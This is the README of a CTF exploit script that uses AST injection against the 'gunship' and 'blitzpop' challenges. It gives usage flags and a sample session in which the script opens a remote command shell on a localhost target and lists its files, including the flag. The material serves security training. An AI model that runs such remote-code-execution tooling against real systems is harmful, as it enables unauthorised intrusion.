# AST Injection script

Small script used for the `gunship` and `blitzpop` ctfs,extended to be a little more flexible.

## Installation

If you want better error reports, you'll need the `beautifulsoup4` package,
but it's not necessary.

```bash
pip install beautifulsoup4
```

Otherwise, just clone the repo into any folder you like.

## Usage

Use the `-u,--url` flag to specify a domain to attack,and optionaly, add any extra JSON that
you need with the `-j,--json` flag.

## Example

```bash
python script.py -u "http://localhost:1337/api/submit" -j blitz.json
```
If needed, you can just write the JSON object

```bash
python script.py --url "http://localhost:1337/api/submit" --json '{artist.name: "Haigh"}'
```
Once you run the script, you should se a command line that allows you to run code on the
attacked machine

```
$ python script.py --url "http://localhost:1337/api/submit" --json '{"artist.name": "Haigh"}'
	>id
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)

	>ls
flagnjEYE
index.js
node_modules
package.json
routes
static
views
yarn.lock

	>exit

Goodbye!
$
```
